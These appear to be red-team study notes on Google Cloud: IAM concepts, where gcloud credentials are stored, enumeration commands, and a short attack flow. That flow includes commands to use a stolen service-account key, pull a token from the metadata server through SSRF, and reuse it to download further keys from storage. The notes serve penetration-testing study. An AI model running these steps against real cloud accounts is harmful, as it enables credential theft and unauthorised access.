# 📚 GCP Red Team Study Notes 

---

## 🎯 Quick Study Guide

### The Core GCP Components

| Component | Purpose | Details |
|-----------|---------|---------|
| **Cloud Identity** | Identity Provider (IdaaS) | Centrally manages users/groups. Can federate with AD/Azure AD. |
| **Google Workspace** | Identity Provider & SaaS | Includes G-Suite (Gmail, Drive, etc). Maps users to GCP. |
| **Google Cloud Platform (GCP)** | Cloud Infrastructure | IaaS/PaaS services running on Google's global infrastructure. |

### 💡 Remember This:
> **Cloud IAM is Resource-Centric** (Unlike AWS). In AWS, you usually attach a policy directly to an Identity (e.g., "User Alice has permission to read Bucket A"). In GCP, you do the conceptual opposite: you attach the policy to the *Resource itself* (Bucket A), and inside that policy, you state that Alice has the "Storage Viewer" role. You never attach policies to users/members directly; you simply invite them into a resource's policy bundle.
> **Service Account** = Non-human identity (runs code, apps, VMs).
> **Metadata Server** = `http://[IP_ADDRESS]/computeMetadata/v1/` (Requires `Metadata-Flavor: Google` header).

---

## 🏗️ GCP Resource Hierarchy

### Hierarchy (Top to Bottom)
```
🏢 Organization (Company)
  └── 📁 Folders (Departments/Teams)
      └── 📁 Projects (Dev, Test, Prod)
          └── 🌍 Resources (Compute, Storage, App Engine)
```

> **Note**: IAM policies are inherited downward. A policy applied at the Organization level propagates to Folders, Projects, and Resources.

---

## 🔑 Identity & Access Management (Cloud IAM)

### 🎯 What is Cloud IAM?
- Controls **who** (members) has **what access** (roles) for **which resource**.
- Follows a **Resource-based policy** instead of an Identity-based policy. Policies are attached to resources, not identities.

### Cloud IAM Objects

```
👤 Members     - Who (Google Account, Service Account, Groups, Domains)
🎭 Roles       - Collections of permissions (What operations are allowed)
📜 Policy      - Binds members to a role on a resource
```

### Types of Members
1. **Google Account** (End users)
2. **Service Account** (Apps/VMs)
3. **Google Group** (A collection of Google Accounts)
4. **Google Workspace / Cloud Identity Domain**
5. **All authenticated users** (Anyone logged into a Google Account)
6. **All users** (Public) (Anyone on the internet)

### Type of Roles
| Role Type | Access Level | Description |
|-----------|-------------|-------------|
| **Basic Roles** | Extremely broad | Legacy roles: Owner, Editor, and Viewer. |
| **Predefined Roles** | Fine-grained | Managed by Google. (e.g., `roles/storage.objectAdmin`) |
| **Custom Roles** | Tailored | Created by orgs. `roles/service.roleName` |

### Permissions Structure
Represented in the form: `service.resource.verb` (e.g., `storage.objects.get`)

### Policy Binding Structure (JSON)
```json
{
  "bindings": [
    {
      "role": "roles/storage.objectAdmin",
      "members": [
        "user:user1@example.com",
        "serviceAccount:my-app@appspot.gserviceaccount.com",
        "group:admins@example.com",
        "domain:google.com"
      ]
    }
  ]
}
```

---

## 🔐 Authentication Methods

### Access Types

| Type | Intended Target | Method |
|------|----------------|--------|
| **GUI (Console)** | Human Users | Username & Password (Long Term) |
| **Programmatic CLI/SDK** | Human Users | OAuth Access Token (Short Term) |
| **Programmatic CLI/SDK** | Applications/VMs | Service Account JSON File (Long Term) |

### CLI Authentication Credentials Storage Locations
```bash
# Windows
C:\Users\<UserName>\AppData\Roaming\gcloud\

# Linux
/home/<UserName>/.config/gcloud/

# Key Files
# access_tokens.db (columns: account_id, access_token, token_expiry, rapt_token)
# credentials.db (columns: account_id, value)
```

---

## 🔍 CLI Based Enumeration

### 🆔 Identity & Account Enumeration
```bash
# Get active user/service accounts (Who am I?)
gcloud auth list

# Get current configuration (user/project)
gcloud config list
```

### 🏢 Organization & Project Enumeration
```bash
# List all organizations the logged-in user can access
gcloud organizations list

# Get IAM policy attached to an organization
gcloud organizations get-iam-policy <OrganizationID>

# List projects in an organization
gcloud projects list

# Get IAM policy for a specific project
gcloud projects get-iam-policy <ProjectID>
```

### 🤖 Service Account Enumeration
```bash
# List all service accounts in a project
gcloud iam service-accounts list

# Get IAM policy for a specific service account
gcloud iam service-accounts get-iam-policy <Service_Account_Email>

# List access keys for a service account
gcloud iam service-accounts keys list --iam-account <Service_Account_Email>
```

### 🎭 Role Enumeration
```bash
# List roles in an organization/project
gcloud iam roles list
gcloud iam roles list --project <ProjectID>

# List permissions inside a role
gcloud iam roles describe roles/owner
gcloud iam roles describe <RoleName> --project <ProjectID>
```

---

## 🎯 Red Team Ops in Google Cloud

### Attack Flow
1. Obtain compromised credentials (Service Account JSON or OAuth Token).
2. Enumerate accessible Cloud Services (Compute, IAM, Storage).
3. Hunt for misconfigured web applications to grab Metadata tokens.
4. Escalate privileges via misconfigured IAM permissions.
5. Exfiltrate data or persistence.

### 1️⃣ Initial Access & Enumeration
```bash
# Authenticate using a stolen Service Account Key
gcloud auth activate-service-account --key-file compromised-key.json

# Check what roles the compromised user has within the project
gcloud projects get-iam-policy <ProjectID> \
  --flatten="bindings[].members" \
  --filter="bindings.members=serviceaccount:<service_account_email>" \
  --format="value(bindings.role)"
```

### 2️⃣ Web Application SSRF / RCE to Identity Token Steal
If an application is vulnerable to SSRF/RCE, you can access the GCP Metadata Server.

> ⚠️ Unlike AWS IMDSv1, GCP requires the `Metadata-Flavor: Google` header to retrieve data, providing some SSRF protection but vulnerable if the attacker can control headers!

```bash
# Retrieve instance Default Service Account Token via Metadata
curl -H "Metadata-Flavor: Google" \
  http://[IP_ADDRESS]/computeMetadata/v1/instance/service-accounts/default/token

> **  Note**: GCP used to have a v1beta1 endpoint that didn't require the header, but Google permanently disabled it in 2020 specifically to kill basic SSRF attacks

# Save out to token.txt for reuse
```

### 3️⃣ Token Reuse & Lateral Movement
```bash
# Reuse stolen access token to list projects
gcloud projects list --access-token-file token.txt

# Escalate to Cloud Storage via Token
gcloud storage ls --access-token-file token.txt
gcloud storage ls gs://<target-bucket> --access-token-file token.txt

# Download sensitive files (e.g. valid service account keys)
gcloud storage cp gs://<bucket>/devops-srvacc-key.json . --access-token-file token.txt

# Authenticate with the new higher-privileged key
gcloud auth activate-service-account --key-file devops-srvacc-key.json
```

---


